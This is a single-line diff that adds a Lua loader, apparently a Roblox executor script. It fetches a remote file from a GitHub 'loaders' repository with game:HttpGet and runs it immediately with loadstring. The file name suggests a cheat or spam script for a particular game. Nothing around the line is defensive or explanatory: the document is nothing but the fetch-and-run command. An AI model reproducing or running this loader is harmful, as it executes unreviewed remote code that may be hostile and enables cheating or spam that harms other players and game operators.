@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TealKnightFree/loaders/main/loaders/neohee-billiard-hall-spam7-aw929xe3n0tn8k.lua"))()
